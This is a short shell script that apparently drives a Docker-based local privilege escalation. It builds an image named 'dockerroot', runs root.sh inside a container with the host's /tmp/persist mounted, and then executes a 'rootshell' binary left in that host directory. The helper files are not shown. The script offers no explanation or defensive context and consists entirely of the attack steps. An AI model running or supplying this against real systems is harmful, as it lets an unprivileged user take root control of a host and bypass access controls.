#!/bin/sh
docker build --rm -t dockerroot .
docker run -v /tmp/persist:/persist dockerroot /bin/sh root.sh
/tmp/persist/rootshell
